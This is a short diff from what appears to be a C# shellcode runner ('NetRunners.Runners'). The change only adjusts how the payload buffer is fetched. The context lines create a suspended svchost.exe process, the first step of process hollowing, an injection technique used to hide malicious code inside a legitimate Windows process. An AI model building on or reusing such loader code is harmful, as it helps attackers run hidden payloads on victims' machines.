@@ -33,8 +33,7 @@ namespace NetRunners.Runners
                 PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                 PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
                 var payload = GetPayloadAndSize();
-                byte[] buf = payload.buf;
-                int sBuf = payload.sBuf;
+                byte[] buf = GetPayload();
 
                 // create suspended svchost process
                 result = CreateProcessA(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, 0, 0x4, IntPtr.Zero, null, ref si, out pi);
